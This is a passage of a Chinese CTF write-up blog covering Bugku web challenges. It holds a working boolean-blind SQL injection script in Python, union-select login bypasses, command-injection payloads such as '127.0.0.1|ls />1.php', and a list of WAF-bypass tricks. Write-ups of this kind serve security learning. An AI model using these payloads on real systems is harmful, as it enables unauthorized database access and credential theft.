<p>mid(字符串 from 起始位置 for 长度)中的for是必须的，因为mid(字符串 from 起始位置)&#x3D;left(字符串,起始位置)，但是加上for之后，发现检测到注入，很明显，for被过滤了</p>
<p>payload:<br>mid(REVERSE(MID((passwd)from(起始位置)))from(-1))</p>
<p>写python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"> </span><br><span class="line">uname = &#123;<span class="string">&#x27;uname&#x27;</span>: <span class="string">&quot;admin&#x27;-(ascii(mid(REVERSE(mid((passwd)from(&#123;start&#125;)))from(-1)))&#123;operator&#125;&#123;value&#125;)-&#x27;&quot;</span>&#125;</span><br><span class="line">passwd = &#123;<span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://114.67.246.176:18609/login.php&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bool_sql</span>(<span class="params">col_min, col_max, ascii_min, ascii_max, url, injection, other_data, judge_string</span>):</span><br><span class="line">    session = rq.Session()</span><br><span class="line">    value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    injection_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    injection_param = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> key, val <span class="keyword">in</span> injection.items():</span><br><span class="line">        injection_data = val</span><br><span class="line">        injection_param = key</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(col_min, col_max):</span><br><span class="line"> </span><br><span class="line">        start = i</span><br><span class="line">        injection_data_1 = injection_data.replace(<span class="string">&#x27;&#123;start&#125;&#x27;</span>, <span class="built_in">str</span>(start))</span><br><span class="line">        injection_data_2 = injection_data.replace(<span class="string">&#x27;&#123;start&#125;&#x27;</span>, <span class="built_in">str</span>(start))</span><br><span class="line">        lmax = ascii_max</span><br><span class="line">        lmin = ascii_min</span><br><span class="line">        <span class="keyword">while</span> lmin &lt;= lmax:</span><br><span class="line">            injection_data1 = injection_data_1</span><br><span class="line">            injection_data2 = injection_data_2</span><br><span class="line">           </span><br><span class="line">            ascii_mid = <span class="built_in">int</span>((lmin + lmax) / <span class="number">2</span>)</span><br><span class="line">            injection_data1 = injection_data1.replace(<span class="string">&#x27;&#123;value&#125;&#x27;</span>, <span class="built_in">str</span>(ascii_mid))</span><br><span class="line">            injection_data2 = injection_data2.replace(<span class="string">&#x27;&#123;value&#125;&#x27;</span>, <span class="built_in">str</span>(ascii_mid))</span><br><span class="line">            injection_data1 = injection_data1.replace(<span class="string">&#x27;&#123;operator&#125;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="comment"># print(injection_data1)</span></span><br><span class="line">            data = &#123;injection_param: injection_data1&#125;</span><br><span class="line">            data.update(other_data)</span><br><span class="line">            html = session.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> judge_string <span class="keyword">in</span> html.text:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            injection_data2 = injection_data2.replace(<span class="string">&#x27;&#123;operator&#125;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">            data = &#123;injection_param: injection_data2&#125;</span><br><span class="line">            data.update(other_data)</span><br><span class="line">            <span class="comment"># print(injection_data2)</span></span><br><span class="line">            html = session.post(url, data=data)</span><br><span class="line">            <span class="comment"># print(html.text)</span></span><br><span class="line">            <span class="keyword">if</span> judge_string <span class="keyword">in</span> html.text:</span><br><span class="line">                lmax = ascii_mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lmin = ascii_mid + <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(ascii_mid)</span></span><br><span class="line">        value += <span class="built_in">chr</span>(ascii_mid)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(bool_sql(<span class="number">1</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">129</span>, url, uname, passwd, <span class="string">&quot;username error!!@_@&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>MD5解密</p>
<p>登录</p>
<p><img src="https://img-blog.csdnimg.cn/20210819052440626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzU4MTg5Nzc4,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>cat&lt;&#x2F;flag得到了flag</p>
<p><img src="https://img-blog.csdnimg.cn/20210819052454494.png" alt="img"></p>
<h2 id="64-login2"><a href="#64-login2" class="headerlink" title="64.login2"></a>64.login2</h2><p>进来先试了一遍万能密码，弱口令，目录爆破都没结果</p>
<p><img src="https://img-blog.csdnimg.cn/782e3e2a0041495a8a968cf61982fd87.png" alt="img"></p>
<p>抓包试试</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221114094223214.png" alt="image-20221114094223214"></p>
<p>base64 解码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221114094253908.png" alt="image-20221114094253908"></p>
<p> 显示如果密码等于它的md5值则应该能登陆成功</p>
<p>这里利用union select 插入密码的md5值绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union select 1,md5(123)#&amp;password=123</span><br><span class="line">&#x27;admin&#x27; union select 1,md5(123)#&#x27;</span><br></pre></td></tr></table></figure>

<p>进入后是一个进程</p>
<p><img src="https://img-blog.csdnimg.cn/7f8662ca38bb49e288095d394e282b03.png" alt="img"></p>
<p> 127.0.0.1|ls &#x2F;没有回显</p>
<p>输入127.0.0.1|sleep 5有延迟说明命令执行了，但是输出可能被过滤了</p>
<p>我们利用&gt;将输出结果保存到文件中查看</p>
<p>127.0.0.1|ls &#x2F;&gt;1.php</p>
<p><img src="https://img-blog.csdnimg.cn/1f4b276ef5f94ad8b0b6628c3d91422e.png" alt="img"></p>
<p>看到flag</p>
<p><img src="https://img-blog.csdnimg.cn/8b849fc1dcde4378b11c968056a3b13b.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">此题要求用户名的密码和密码的MD5值相同，联合注入中</span><br><span class="line">select 1,md5(123)#:</span><br><span class="line">找出密码是用MD5加密123的用户名</span><br><span class="line">这样用户名就是密码为md5(123)的用户名，密码输入123就登陆成功了</span><br></pre></td></tr></table></figure>







<h2 id="65-sql注入"><a href="#65-sql注入" class="headerlink" title="65.sql注入"></a>65.sql注入</h2><p>题目提示</p>
<p>基于布尔的SQL盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">需要了解mysql的知识点：</span><br><span class="line"></span><br><span class="line">union select 联合查询，联合注入常用</span><br><span class="line">database() 回显当前连接的数据库</span><br><span class="line">version() 查看当前sql的版本如：mysql 1.2.3， mariadb-4.5.6</span><br><span class="line">group_concat() 把产生的同一分组中的值用,连接，形成一个字符串</span><br><span class="line">information_schema 存了很多mysql信息的数据库</span><br><span class="line">information_schema.schemata information_schema库的一个表,名为schemata</span><br><span class="line">schema_name schemata表中存储mysql所有数据库名字的字段</span><br><span class="line">information_schema.tables 存了mysql所有的表</span><br><span class="line">table_schema tables表中存每个表对应的数据库名的字段</span><br><span class="line">table_name 表的名字和table_schema一一对应</span><br><span class="line">information_schema.columns columns表存了所有的列的信息4</span><br><span class="line">column_name 当你知道一个表的名字时，可通过此字段获得表中的所有字段名(列名)</span><br><span class="line">table_name 表的名字和column_name一一对应</span><br><span class="line">select updatexml(1,concat(0x7e,database(),0x7e),1); 这里注意，只在databse()处改你想要的内容即可报错回显</span><br><span class="line">right(str, num) 字符串从右开始截取num个字符</span><br><span class="line">left(str,num) 同理:字符串从左开始截取num个字符</span><br><span class="line">substr(str,N,M) 字符串，从第N个字符开始，截取M个字符</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210620191503886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code> 发现admin回显密码错误,那么用户名就是admin：
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20210620193607629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>用语句：<br>admin’or1&#x3D;1–+</p>
<p><img src="https://img-blog.csdnimg.cn/20210620193949864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>然后我们就用sql过滤字典看看过滤的字符有哪些得到：</p>
<p><img src="https://img-blog.csdnimg.cn/20210620194544184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>它过滤了&#x3D;，空格，+，and,for,where,&#x2F;**&#x2F;,等很多字符，<br>但是我们还能利用剩下的字符来进行注入<br>这里发现它过滤了空格:</p>
<p>一般绕过空格过滤的方法有以下几种方法来取代空格</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span>，绕过：</span><br><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>users;</span><br><span class="line"></span><br><span class="line">()，绕过</span><br><span class="line"><span class="keyword">select</span>(id)<span class="keyword">from</span>(users);</span><br><span class="line"></span><br><span class="line">回车(url编码中的<span class="operator">%</span><span class="number">0</span>a)，绕过</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">from</span> </span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> users</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">where</span> </span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">`(键按钮)，绕过</span><br><span class="line"><span class="keyword">select</span>`id`<span class="keyword">from</span>`users`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>利用（）</p>
<p>or,#，&lt;&gt;我们是能利用的</p>
<p>于是，我们就利用&lt;&gt;构造语句：<br>a’<br>a’or(1&lt;&gt;2)#<br>a’or(1&lt;&gt;1)#</p>
<p><img src="https://img-blog.csdnimg.cn/20210620195245431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/2021062019513315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210620195100520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>这里可以看到，<br>a’<br>回显错误的用户</p>
<p>a’or(1&lt;&gt;2)#<br>回显是密码错误，</p>
<p>而：a’or(1&lt;&gt;1)#<br>回显是错误的用户</p>
<p>这里可以看到它是先判断用户是否存在，在判断密码。<br>而a’or(1&lt;&gt;2)，回显用密码错误，所以判断执行了语句<br>因为1&lt;&gt;2为真，又是or连接一真一假,所以返回真，密码错误。<br>而1&lt;&gt;1为假，a 用户不存在为假，用or连接两假所以返回为假，<br>用户不存在。</p>
<p>所以，这里基本可以判断这是一个布尔的SQL盲注<br>语句为真值时返回：密码错误<br>语句为假值时返回：用户不存在<br>还有一种返回是：非法字符</p>
<p>到这里我们就能利用语句，去测试当前的数据库长度<br>语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;or(length(database())&gt;0)#</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2021062119373720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;or(length(database())&gt;10)#</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210621193802182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>这里可以看到a’or(length(database())&gt;0)#返回密码错误，<br>而a’or(length(database())&gt;10)#返回用户不存在<br>所以基本确定当前数据库名长度在0到10之间</p>
<p>得到当前数据库长度为8</p>
<p>字符串截取函数substr</p>
<p>substr((str)from()for())</p>
<p>语句substr(str from number)有一个特点：<br>substr(‘flag’ from 1)—————&gt;返回：flag<br>substr(‘flag’ from 2)—————&gt;返回：lag<br>substr(‘flag’ from 3)—————&gt;返回：ag<br>substr(‘flag’ from 4)—————&gt;返回：g</p>
<p>from后面的数字表示它从第几位开始取字符</p>
<p>字符串翻转函数reverse()</p>
<p>用函数reverse()翻转过来在从最后一位开始取就得<br>到之前没有翻转的第一个字符；</p>
<p>substr((reverse(substr(‘flag’ form 1))) from 4 )————-&gt;返回：f<br>substr((reverse(substr(‘flag’ form 2))) from 3 )————-&gt;返回：l<br>substr((reverse(substr(‘flag’ form 3))) from 2 )————-&gt;返回：a<br>substr((reverse(substr(‘flag’ form 4))) from 1 )————-&gt;返回：g</p>
<p>构造报库名的语句是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&#x27;or(ord(substr(reverse(substr((database())from(1)))from(8)))&lt;&gt;115)#</span></span><br></pre></td></tr></table></figure>

<p>得到结果：</p>
<p><img src="https://img-blog.csdnimg.cn/20210621215508942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>和我设想的一样，所以基于这个原理自己写一个python<br>报出当前数据库名得到：</p>
<p><img src="https://img-blog.csdnimg.cn/20210621220107541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>接下就是报表</p>
<p>这里它过滤:information,where,is ,exists,</p>
<p>一，注释符号绕过：<br>原理： 被注释的内容会被执行<br>常用的注释符有(–空格,#,&#x2F;**&#x2F;,&#x2F;&#x2F;)：</p>
<p>–空格 注释内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users -- where id = 666;</span><br></pre></td></tr></table></figure>

<p>#注释内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users # where id = 999;</span><br></pre></td></tr></table></figure>


<p>&#x2F;<em>注释内容</em>&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users /* where id = 999*/;</span><br></pre></td></tr></table></figure>


<p>&#x2F;&#x2F;注释内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users // where id = 999;</span><br></pre></td></tr></table></figure>


<p>二，大小写绕过：<br>用于 waf的正则对大小写不敏感的情况，<br>waf过滤了关键字select，可以使用Select等绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sEleCt * from users where id = 520 union SeLecT 1,2</span><br></pre></td></tr></table></figure>


<p>三,内联注释绕过：<br>内联注释就是把一些特有的仅在MYSQL上的语句放在 &#x2F;<em>!..</em>&#x2F; 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = -1 union /*!select*/ 1,2</span><br></pre></td></tr></table></figure>


<p>四，双写关键字绕过:<br>在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = -1 union seleselectct 1,2</span><br></pre></td></tr></table></figure>


<p>特殊编码绕过<br>十六进制绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username = &#x27;test&#x27;;</span><br></pre></td></tr></table></figure>


<p>test用十六进制编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username = 0x7465737431;</span><br></pre></td></tr></table></figure>


<p>ascii编码绕过<br>test 等价于<br>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)<br>tip:好像新版mysql不能用了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where text = CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116);</span><br></pre></td></tr></table></figure>


<p>然后发现这些方法都不行，都不能绕开where和Information</p>
<p>利用mysql5.7新增的sys.schema_auto_increment_columns</p>
<p>以下为该视图的所有列</p>
<p><img src="https://img-blog.csdnimg.cn/20210621224446787.png" alt="在这里插入图片描述"></p>
<p>sys.schema_table_statistics_with_buffer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这是sys数据库下的视图，里面存储着所有数据库所有表的统计信息</span><br><span class="line"></span><br><span class="line">与它表结构相似的视图还有</span><br><span class="line"></span><br><span class="line">sys.x$schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line">sys.x$schema_table_statistics</span><br><span class="line"></span><br><span class="line">sys.x$ps_schema_table_statistics_io</span><br></pre></td></tr></table></figure>

<p>以下为该视图的常用列（全部列有很多很多）</p>
<p><img src="https://img-blog.csdnimg.cn/20210621224518951.png" alt="在这里插入图片描述"></p>
<p>mysql默认存储引擎innoDB携带的表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line"></span><br><span class="line">mysql.innodb_index_stats</span><br><span class="line"></span><br><span class="line">两表均有database_name和table_name字段，可以利用</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210621224539422.png" alt="在这里插入图片描述"></p>
<p>用python写个脚本把字典里面<br>的表和字段的都遍历查询一遍，应该能得到正确的表名和字段</p>
<p><img src="https://img-blog.csdnimg.cn/20210621230213494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>表名和字段跑出来分别是：admin,pasword</p>
<p>查询字段内容</p>
<p>构造语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&#x27;or(ord(substr(reverse(substr((select(group_concat(password))from(blindsql.admin))from(1)))from(32)))&lt;&gt;115)#</span></span><br></pre></td></tr></table></figure>

<p>python脚本爆破得到</p>
<p><img src="https://img-blog.csdnimg.cn/20210621231450993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>得到爆破结果，根据字段password信息,这是密码,是用md5加密</p>
<p><img src="https://img-blog.csdnimg.cn/20210621231929478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BsYW50MTIzNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://jiutu2003.github.io">jiutu2003</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/Bugku/Bugku/">https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/Bugku/Bugku/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jiutu2003.github.io" target="_blank">jiutu2003</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%9E%E6%88%98/">实战</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/501ea766baf4b2a2c91d2e163d7c4b04.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/Web/Web%E6%A1%86%E6%9E%B6/Flask/Flask/" title="Flask"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127008797.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Flask</div></div></a></div><div class="next-post pull-right"><a href="/%E5%AE%9E%E6%88%98/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" title="攻防世界"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/735eceff91f2a291064f8242242c831b.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">攻防世界</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/%E5%AE%9E%E6%88%98/ctfshow/ctfshow/" title="ctfshow"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127097053.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-23</div><div class="title">ctfshow</div></div></a></div><div><a href="/%E5%AE%9E%E6%88%98/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" title="攻防世界"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/735eceff91f2a291064f8242242c831b.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-24</div><div class="title">攻防世界</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/242ae48778369e7a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">jiutu2003</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">1.签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Simple-SSTI-1"><span class="toc-number">2.</span> <span class="toc-text">2.Simple_SSTI_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Simple-SSTI-2"><span class="toc-number">3.</span> <span class="toc-text">3.Simple_SSTI_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%BF%99%E6%98%AF%E4%B8%80%E5%BC%A0%E5%8D%95%E7%BA%AF%E7%9A%84%E5%9B%BE%E7%89%87"><span class="toc-number">4.</span> <span class="toc-text">4.这是一张单纯的图片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 